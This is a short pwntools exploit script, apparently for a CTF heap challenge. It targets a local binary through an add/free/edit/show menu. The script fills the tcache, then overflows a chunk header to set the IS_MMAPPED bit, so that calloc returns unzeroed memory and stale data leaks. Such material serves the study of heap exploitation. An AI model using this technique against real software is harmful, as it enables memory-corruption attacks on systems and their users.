# calloc2.py
from pwn import *
p = process("./calloc2")
def add(size):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(size))
def free(idx):
	print p.sendlineafter(">","2")
	print p.sendlineafter(":",str(idx))
def edit(idx, data):
	print p.sendlineafter(">","3")
	print p.sendlineafter(":",str(idx))
	print p.sendafter("",str(data))
def show(idx):
	print p.sendlineafter(">","4")
	print p.sendlineafter(":",str(idx))
for i in range(0, 7):
	add(24)
for i in range(0, 7):
	free(i)
add(24) # 7
add(24) # 8
add(24) # 9
free(8)
edit(7, "A"*16 + p64(0) + p32(0x22)) # IS_MMAPED 0x21 - 0x22
add(24) # 10
edit(10, "P"*8)
show(10)
p.interactive()